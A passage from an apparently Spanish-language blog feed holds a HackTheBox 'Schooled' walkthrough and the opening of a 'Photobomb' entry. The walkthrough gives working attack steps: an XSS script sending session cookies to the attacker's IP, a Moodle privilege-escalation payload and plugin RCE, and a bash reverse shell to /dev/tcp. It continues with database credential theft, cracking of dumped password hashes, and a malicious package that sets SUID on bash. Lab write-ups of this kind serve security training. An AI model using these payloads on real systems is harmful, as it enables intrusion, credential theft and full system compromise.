  <li>Nos dice que necesitamos un <code class="language-plaintext highlighter-rouge">MoodleNet</code> Profile <a href="https://moodle.com/es/news/moodlenet-what-is-a-federated-social-network/">https://moodle.com/es/news/moodlenet-what-is-a-federated-social-network/</a>.</li>
</ul>

<h2 id="shell-as-www">Shell as www</h2>

<ul>
  <li>
    <p>Si buscamos alguna vulnerabilidad relacionada con esto, en la pagina de <code class="language-plaintext highlighter-rouge">moodle</code> nos comparten que es posible hacer un XSS mediante un parámetro en el <code class="language-plaintext highlighter-rouge">user profile</code> <a href="https://moodle.org/mod/forum/discuss.php?d=410839#p1657001">https://moodle.org/mod/forum/discuss.php?d=410839#p1657001</a>.</p>
  </li>
  <li>
    <p>Si nos vamos a editar nuestro perfil encontramos una parte donde nos dice <code class="language-plaintext highlighter-rouge">MoodleNet profile</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/9.png" />
</p>

<ul>
  <li>Como es un XSS <a href="https://book.hacktricks.xyz/es/pentesting-web/xss-cross-site-scripting">https://book.hacktricks.xyz/es/pentesting-web/xss-cross-site-scripting</a> vamos a insertar una etiqueta para ver si obtenemos una petición a nuestro servidor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script <span class="nv">src</span><span class="o">=</span><span class="s2">"http://10.10.14.13/GG.js"</span><span class="o">&gt;</span>&lt;/script&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/10.png" />
</p>

<ul>
  <li>Si le damos a <code class="language-plaintext highlighter-rouge">Update Profile</code> obtenemos la petición.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:16:00] code 404, message File not found
10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:16:00] <span class="s2">"GET /GG.js HTTP/1.1"</span> 404 -
10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:16:10] code 404, message File not found
10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:16:10] <span class="s2">"GET /GG.js HTTP/1.1"</span> 404 -
</code></pre></div></div>

<ul>
  <li>Con esta vulnerabilidad podemos robar Cookies de sesión podemos hacer un <code class="language-plaintext highlighter-rouge">.js</code> que haga un <code class="language-plaintext highlighter-rouge">request</code> de la <code class="language-plaintext highlighter-rouge">cookie</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>GG.js
var request <span class="o">=</span> new XMLHttpRequest<span class="o">()</span><span class="p">;</span>
request.open<span class="o">(</span><span class="s1">'GET'</span>, <span class="s1">'http://10.10.14.13/?cookie='</span> + document.cookie<span class="o">)</span><span class="p">;</span>
request.send<span class="o">()</span><span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a volver a inyectar la misma etiqueta para ver si nos llega una <code class="language-plaintext highlighter-rouge">Cookie</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:22:23] <span class="s2">"GET /GG.js HTTP/1.1"</span> 200 -
10.10.10.234 - - <span class="o">[</span>10/Oct/2024 18:22:23] <span class="s2">"GET /?cookie=MoodleSession=f0f3evpeu3u7bmj1ves48hfrt4 HTTP/1.1"</span> 200 -
10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:22:25] <span class="s2">"GET /GG.js HTTP/1.1"</span> 200 -
10.10.14.13 - - <span class="o">[</span>10/Oct/2024 18:22:25] <span class="s2">"GET /?cookie=MoodleSession=hpo7nmn5ui79m0cfqdo14akfgi HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Una ves cambiamos la <code class="language-plaintext highlighter-rouge">Cookie</code> simplemente recargamos la pagina.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/11.png" />
</p>

<ul>
  <li>Y ya estamos como otro usuario.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/12.png" />
</p>

<ul>
  <li>
    <p>Bueno realmente no encontramos nada interesante pero si buscamos en Github encontramos esto que es interesante <a href="https://github.com/HoangKien1020/CVE-2020-14321/tree/master">https://github.com/HoangKien1020/CVE-2020-14321/tree/master</a> podemos obtener RCE a partir de subir un .zip y al parecer para obtener privilegios de Manager le inyecta todo el <code class="language-plaintext highlighter-rouge">payload</code> que deja abajo en el repositorio.</p>
  </li>
  <li>
    <p>El problema es que nos tenemos que convertir en un usuario que sea Manager y una de ellos como lo vimos en la pagina web principal es <code class="language-plaintext highlighter-rouge">Lianne Carter</code> .</p>
  </li>
  <li>
    <p>Si le damos en <code class="language-plaintext highlighter-rouge">Enrol Users</code> podemos ver que si existe.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/13.png" />
</p>

<ul>
  <li>
    <p>Una vez añadido el usuario no podemos convertirnos en el pero en <code class="language-plaintext highlighter-rouge">Moodle</code> hay una opción para poder convertirnos en otro usuario.</p>
  </li>
  <li>
    <p>Ahora vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">BurpSuite</code> a la hora de añadir al usuario <strong>Hay que eliminarlo primero otra vez</strong>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/14.png" />
</p>

<ul>
  <li>
    <p>Ahora si vemos hay un parámetro que se llama <code class="language-plaintext highlighter-rouge">roletoassing</code> vamos a cambiarlo a 1 ya que casi siempre es el del admin, aparte vemos uno que se llama <code class="language-plaintext highlighter-rouge">userlist</code> que es el 25 pero nosotros somos el 24 puedes comprobarlo yendo a tu perfil .</p>
  </li>
  <li>
    <p>Ahora simplemente le damos a Send.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/15.png" />
</p>

<ul>
  <li>Funciono.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/16.png" />
</p>

<ul>
  <li>
    <p>Ahora hacemos un Forward y vemos esto: “en caso de no funcionarte no lo hagas desde el repeater”.</p>
  </li>
  <li>
    <p>Si lo volvemos añadir vemos que ahora nos aparece esto.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/17.png" />
</p>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/18.png" />
</p>

<ul>
  <li>No podemos instalar <code class="language-plaintext highlighter-rouge">Plugins</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/19.png" />
</p>

<ul>
  <li>
    <p>Si regresamos al <code class="language-plaintext highlighter-rouge">POC</code> recordemos que inyecta un <code class="language-plaintext highlighter-rouge">Payload</code> para obtener full <code class="language-plaintext highlighter-rouge">permissions</code> así que nos falta eso.</p>
  </li>
  <li>
    <p>Ahora le damos <code class="language-plaintext highlighter-rouge">click</code> en Manager.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/20.png" />
</p>

<ul>
  <li>Después le damos en <code class="language-plaintext highlighter-rouge">Edit</code> y vamos a capturar a la hora de hacer <code class="language-plaintext highlighter-rouge">Save Changes</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/burp.png" />
</p>

<ul>
  <li>Ahora cambiamos todo el <code class="language-plaintext highlighter-rouge">payload</code> por el que esta en Github.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/payload.png" />
</p>

<ul>
  <li>Ahora al darle a <code class="language-plaintext highlighter-rouge">Send</code> vemos que ya podemos instalar plugins.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/schooled/GG.png" />
</p>

<ul>
  <li>
    <p>Ahora en <code class="language-plaintext highlighter-rouge">Plugins</code> vamos a subir el .zip que nos dicen en el POC.</p>
  </li>
  <li>
    <p>Después de subirlo tenemos RCE.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd<span class="o">=</span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
</code></pre></div></div>

<ul>
  <li>Enviamos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.13/443 0&gt;&amp;1'"</span> http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php
</code></pre></div></div>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.13] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234] 52493
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1132<span class="o">)</span>: Can<span class="s1">'t assign requested address
bash: no job control in this shell
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ whoami
www
[www@Schooled /usr/local/www/apache24/data/moodle/blocks/rce/lang/en]$ 
</span></code></pre></div></div>

<h2 id="shell-as--jamie">Shell as  jamie</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>www@Schooled /]<span class="nv">$ </span>/usr/local/bin/python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
/usr/local/bin/python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("bash")'</span>
<span class="o">[</span>www@Schooled /]<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 443
                                                       
❯ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span><span class="nb">fg
</span>reset xterm
ENTER
</code></pre></div></div>

<ul>
  <li>Vemos la contraseña para la base de datos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>www@Schooled /usr/local/www/apache24/data/moodle]<span class="nv">$ </span><span class="nb">cat </span>config.php
&lt;?php  // Moodle configuration file

<span class="nb">unset</span><span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
global <span class="nv">$CFG</span><span class="p">;</span>
<span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">'mysqli'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">'native'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">'moodle'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">'moodle'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">'PlaybookMaster2020'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">'mdl_'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
  <span class="s1">'dbpersist'</span> <span class="o">=&gt;</span> 0,
  <span class="s1">'dbport'</span> <span class="o">=&gt;</span> 3306,
  <span class="s1">'dbsocket'</span> <span class="o">=&gt;</span> <span class="s1">''</span>,
  <span class="s1">'dbcollation'</span> <span class="o">=&gt;</span> <span class="s1">'utf8_unicode_ci'</span>,
<span class="o">)</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">'http://moodle.schooled.htb/moodle'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">'/usr/local/www/apache24/moodledata'</span><span class="p">;</span>
<span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>

<span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>

require_once<span class="o">(</span>__DIR__ <span class="nb">.</span> <span class="s1">'/lib/setup.php'</span><span class="o">)</span><span class="p">;</span>

// There is no php closing tag <span class="k">in </span>this file,
// it is intentional because it prevents trailing whitespace problems!
<span class="o">[</span>www@Schooled /usr/local/www/apache24/data/moodle]<span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Nos conectamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>www@Schooled /usr/local/www/apache24/data/moodle]<span class="nv">$ </span>/usr/local/bin/mysql <span class="nt">-u</span> moodle <span class="nt">-pPlaybookMaster2020</span> moodle
mysql: <span class="o">[</span>Warning] Using a password on the <span class="nb">command </span>line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MySQL connection <span class="nb">id </span>is 788
Server version: 8.0.23 Source distribution

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

moodle@localhost <span class="o">[</span>moodle]&gt; 
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>moodle@localhost <span class="o">[</span>moodle]&gt; <span class="k">select </span>username, email, password from mdl_user<span class="p">;</span>
+-------------------+----------------------------------------+--------------------------------------------------------------+
| username          | email                                  | password                                                     |
+-------------------+----------------------------------------+--------------------------------------------------------------+
| guest             | root@localhost                         | <span class="nv">$2y$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 |
| admin             | jamie@staff.schooled.htb               | <span class="nv">$2y$10$3D</span>/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW |
| bell_oliver89     | bell_oliver89@student.schooled.htb     | <span class="nv">$2y$10$N0feGGafBvl</span>.g6LNBKXPVOpkvs8y/axSPyXb46HiFP3C9c42dhvgK |
| orchid_sheila89   | orchid_sheila89@student.schooled.htb   | <span class="nv">$2y$10$YMsy0e4x4vKq7HxMsDk</span>.OehnmAcc8tFa0lzj5b1Zc8IhqZx03aryC |
| chard_ellzabeth89 | chard_elizabeth89@student.schooled.htb | <span class="nv">$2y$10$D0Hu9XehYbTxNsf</span>/uZrxXeRp/6pmT1/6A.Q2CZhbR26lCPtf68wUC |
| morris_jake89     | morris_jake89@student.schooled.htb     | <span class="nv">$2y$10$UieCKjut2IMiglWqRCkSzerF</span>.8AnR8NtOLFmDUcQa90lair7LndRy |
| heel_james89      | heel_james89@student.schooled.htb      | <span class="nv">$2y$10$sjk</span>.jJKsfnLG4r5rYytMge4sJWj4ZY8xeWRIrepPJ8oWlynRc9Eim |
| nash_michael89    | nash_michael89@student.schooled.htb    | <span class="nv">$2y$10$yShrS</span>/zCD1Uoy0JMZPCDB.saWGsPUrPyQZ4eAS50jGZUp8zsqF8tu |
| singh_rakesh89    | singh_rakesh89@student.schooled.htb    | <span class="nv">$2y$10$Yd52KrjMGJwPUeDQRU7wNu6xjTMobTWq3eEzMWeA2KsfAPAcHSUPu</span> |
| taint_marcus89    | taint_marcus89@student.schooled.htb    | <span class="nv">$2y$10$kFO4L15Elng2Z2R4cCkbdOHyh5rKwnG4csQ0gWUeu2bJGt4Mxswoa</span> |
| walls_shaun89     | walls_shaun89@student.schooled.htb     | <span class="nv">$2y$10$EDXwQZ9Dp6UNHjAF</span>.ZXY2uKV5NBjNBiLx/WnwHiQ87Dk90yZHf3ga |
| smith_john89      | smith_john89@student.schooled.htb      | <span class="nv">$2y$10$YRdwHxfstP0on0Yzd2jkNe</span>/YE/9PDv/YC2aVtC97mz5RZnqsZ/5Em |
| white_jack89      | white_jack89@student.schooled.htb      | <span class="nv">$2y$10$PRy8LErZpSKT7YuSxlWntOWK</span>/5LmSEPYLafDd13Nv36MxlT5yOZqK |
| travis_carl89     | travis_carl89@student.schooled.htb     | <span class="nv">$2y$10$VO</span>/MiMUhZGoZmWiY7jQxz.Gu8xeThHXCczYB0nYsZr7J5PZ95gj9S |
| mac_amy89         | mac_amy89@student.schooled.htb         | <span class="nv">$2y$10$PgOU</span>/KKquLGxowyzPCUsi.QRTUIrPETU7q1DEDv2Dt.xAjPlTGK3i |
| james_boris89     | james_boris89@student.schooled.htb     | <span class="nv">$2y$10$N4hGccQNNM9oWJOm2uy1LuN50EtVcba</span>/1MgsQ9P/hcwErzAYUtzWq |
| pierce_allan      | pierce_allan89@student.schooled.htb    | <span class="nv">$2y$10$ia9fKz9</span>.arKUUBbaGo2FM.b7n/QU1WDAFRafgD6j7uXtzQxLyR3Zy |
| henry_william89   | henry_william89@student.schooled.htb   | <span class="nv">$2y$10$qj67d57dL</span>/XzjCgE0qD1i.ION66fK0TgwCFou9yT6jbR7pFRXHmIu |
| harper_zoe89      | harper_zoe89@student.schooled.htb      | <span class="nv">$2y$10$mnYTPvYjDwQtQuZ9etlFmeiuIqTiYxVYkmruFIh4rWFkC3V1Y0zPy</span> |
| wright_travis89   | wright_travis89@student.schooled.htb   | <span class="nv">$2y$10$XFE</span>/IKSMPg21lenhEfUoVemf4OrtLEL6w2kLIJdYceOOivRB7wnpm |
| allen_matthew89   | allen_matthew89@student.schooled.htb   | <span class="nv">$2y$10$kFYnbkwG</span>.vqrorLlAz6hT.p0RqvBwZK2kiHT9v3SHGa8XTCKbwTZq |
| sanders_wallis89  | sanders_wallis89@student.schooled.htb  | <span class="nv">$2y$10$br9VzK6V17zJttyB8jK9Tub</span>/1l2h7mgX1E3qcUbLL.GY.JtIBDG5u |
| higgins_jane      | higgins_jane@staff.schooled.htb        | <span class="nv">$2y$10$n9SrsMwmiU</span>.egHN60RleAOauTK2XShvjsCS0tAR6m54hR1Bba6ni2 |
| phillips_manuel   | phillips_manuel@staff.schooled.htb     | <span class="nv">$2y$10$ZwxEs65Q0gO8rN8zpVGU2eYDvAoVmWYYEhHBPovIHr8HZGBvEYEYG</span> |
| carter_lianne     | carter_lianne@staff.schooled.htb       | <span class="nv">$2y$10$jw</span>.KgN/SIpG2MAKvW8qdiub67JD7STqIER1VeRvAH4fs/DPF57JZe |
| parker_dan89      | parker_dan89@student.schooled.htb      | <span class="nv">$2y$10$MYvrCS5ykPXX0pjVuCGZOOPxgj</span>.fiQAZXyufW5itreQEc2IB2.OSi |
| parker_tim89      | parker_tim89@student.schooled.htb      | <span class="nv">$2y$10$YCYp8F91YdvY2QCg3Cl5r</span>.jzYxMwkwEm/QBGYIs.apyeCeRD7OD6S |
| miguelito7x       | miguel@student.schooled.htb            | <span class="nv">$2y$10$ZOlwQZ5odMhZgpHTOvoFveTAFJrw3bum5l321wLE32K7QNqxEyFR6</span> |
+-------------------+----------------------------------------+--------------------------------------------------------------+
28 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

moodle@localhost <span class="o">[</span>moodle]&gt; 

</code></pre></div></div>

<ul>
  <li>Como Jamie es una usuaria del sistema vamos a crackear su hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Created directory: /home/miguelrega7/.john
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 1024 <span class="k">for </span>all loaded hashes
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
<span class="o">!</span>QAZ2wsx         <span class="o">(</span>?<span class="o">)</span>     
1g 0:00:04:12 DONE <span class="o">(</span>2024-10-10 19:32<span class="o">)</span> 0.003966g/s 55.12p/s 55.12c/s 55.12C/s 110689..superpet
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</code></pre></div></div>

<ul>
  <li>Ahora nos conectamos por ssh.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh jamie@10.10.10.234
The authenticity of host <span class="s1">'10.10.10.234 (10.10.10.234)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:d9VHI+sFsz7EhIePN0ir7HNAMuj8q3kVvpaQlTOtkU8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.234<span class="s1">' (ED25519) to the list of known hosts.
(jamie@10.10.10.234) Password for jamie@Schooled:
Last login: Fri Oct 29 12:35:59 2021 from 10.10.14.23
FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021

Welcome to FreeBSD!

Release Notes, Errata: https://www.FreeBSD.org/releases/
Security Advisories:   https://www.FreeBSD.org/security/
FreeBSD Handbook:      https://www.FreeBSD.org/handbook/
FreeBSD FAQ:           https://www.FreeBSD.org/faq/
Questions List: https://lists.FreeBSD.org/mailman/listinfo/freebsd-questions/
FreeBSD Forums:        https://forums.FreeBSD.org/

Documents installed with the system are in the /usr/local/share/doc/freebsd/
directory, or can be installed later with:  pkg install en-freebsd-doc
For other languages, replace "en" with a language code like de or fr.

Show the version of FreeBSD installed:  freebsd-version ; uname -a
Please include that output and any error messages when posting questions.
Introduction to manual pages:  man man
FreeBSD directory layout:      man hier

To change this login announcement, see motd(5).
You can upload the dmesg of your system to help developers get an overview of commonly
used hardware and peripherals for FreeBSD. Use the curl package to upload it like this:
curl -v -d "nickname=$USER" -d "description=FreeBSD/$(uname -m) on \
$(kenv smbios.system.maker) $(kenv smbios.system.product)" -d "do=addd" \
--data-urlencode '</span>dmesg@/var/run/dmesg.boot<span class="s1">' http://dmesgd.nycbug.org/index.cgi
jamie@Schooled:~ $ export TERM=xterm
</span></code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">cat </span>user.txt 
e8c13c552c9960e9dd4a5d77eb173e8d
</code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>

<ul>
  <li>Podemos ejecutar esto como cualquier usuario y sin contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:~ <span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
User jamie may run the following commands on Schooled:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg update
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/sbin/pkg <span class="nb">install</span> <span class="k">*</span>
jamie@Schooled:~ <span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>
    <p><a href="https://gtfobins.github.io/gtfobins/pkg/#sudo">https://gtfobins.github.io/gtfobins/pkg/#sudo</a>.</p>
  </li>
  <li>
    <p>Necesitas instalar esto <a href="https://github.com/jordansissel/fpm">https://github.com/jordansissel/fpm</a>.</p>
  </li>
  <li>
    <p>Todo esto lo vamos a hacer en nuestra maquina de atacante.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
<span class="nb">echo</span> <span class="s1">'chmod u+s /bin/bash'</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/x.sh
                                                       
❯  fpm <span class="nt">-n</span> x <span class="nt">-s</span> <span class="nb">dir</span> <span class="nt">-t</span> freebsd <span class="nt">-a</span> all <span class="nt">--before-install</span> <span class="nv">$TF</span>/x.sh <span class="nv">$TF</span>
Created package <span class="o">{</span>:path<span class="o">=&gt;</span><span class="s2">"x-1.0.txz"</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Ahora lo pasamos ala máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp <span class="nv">$ </span>curl http://10.10.14.13/x-1.0.txz <span class="nt">--output</span> x-1.0.txz
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 <span class="nt">--</span>:--:-- 100   512  100   512    0     0   1391      0 <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:-- <span class="nt">--</span>:--:--  1395
jamie@Schooled:/tmp <span class="nv">$ </span><span class="nb">ls
</span>mysql.sock		mysqlx.sock.lock
mysql.sock.lock		x-1.0.txz
mysqlx.sock
jamie@Schooled:/tmp <span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Lo ejecutamos rapido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp/repo <span class="nv">$ </span><span class="nb">sudo </span>pkg <span class="nb">install</span> <span class="nt">-y</span> <span class="nt">--no-repo-update</span> ./x-1.0.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. <span class="s1">'pkg update'</span> required
Checking integrity... <span class="k">done</span> <span class="o">(</span>0 conflicting<span class="o">)</span>
The following 1 package<span class="o">(</span>s<span class="o">)</span> will be affected <span class="o">(</span>of 0 checked<span class="o">)</span>:

New packages to be INSTALLED:
	x: 1.0

Number of packages to be installed: 1
<span class="o">[</span>1/1] Installing x-1.0...
Extracting x-1.0: 100%
jamie@Schooled:/tmp/repo <span class="nv">$ </span>
</code></pre></div></div>

<ul>
  <li>Ahora es SUID.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp/repo <span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /usr/local/bin/bash
<span class="nt">-rwsr-xr-x</span>  1 root  wheel  941288 Feb 20  2021 /usr/local/bin/bash
jamie@Schooled:/tmp/repo <span class="nv">$ </span>
</code></pre></div></div>

<h2 id="shell-as-root-and-root-flag">Shell as root and root flag</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jamie@Schooled:/tmp/repo <span class="nv">$ </span>bash <span class="nt">-p</span>
<span class="o">[</span>jamie@Schooled /tmp/repo]# <span class="nb">whoami
</span>root
<span class="o">[</span>jamie@Schooled /tmp/repo]# <span class="nb">cd</span> /root
<span class="o">[</span>jamie@Schooled /root]# <span class="nb">cat </span>root.txt 
b7e535ff5ba87d26e35cccd47f06625a
<span class="o">[</span>jamie@Schooled /root]# 
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Photobomb (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html" rel="alternate" type="text/html" title="HackTheBox - Photobomb (easy)" /><published>2024-09-29T00:00:00-06:00</published><updated>2024-09-29T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/09/29/photobomb.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/52e97c6ca888644478ddcadfcd9f8be5.png" />
</p>

<ul>
  <li>Photobomb is an easy Linux machine where plaintext credentials are used to access an internal web application with a <code class="language-plaintext highlighter-rouge">Download</code> functionality that is vulnerable to a blind command injection. Once a foothold as the machine main user is established, a poorly configured shell script that references binaries without their full paths is leveraged to obtain escalated privileges, as it can be ran with <code class="language-plaintext highlighter-rouge">sudo</code>.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ catn ../nmap/targeted
<span class="c"># Nmap 7.94SVN scan initiated Sun Sep 29 12:39:55 2024 as: nmap -sCV -p22,80 -oN targeted 10.10.11.182</span>
Nmap scan report <span class="k">for </span>10.10.11.182
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>

